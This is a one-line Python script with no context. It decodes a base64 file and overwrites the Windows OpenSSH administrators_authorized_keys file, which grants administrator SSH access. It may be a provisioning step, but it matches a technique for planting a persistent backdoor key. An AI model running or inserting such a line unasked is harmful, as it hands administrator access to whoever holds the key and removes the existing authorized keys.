import base64;open(r'C:\ProgramData\ssh\administrators_authorized_keys','w').write(base64.b64decode(open(r'C:\Bible\pk.b64').read()));open(r'C:\Bible\out.txt','w').write('OK') 
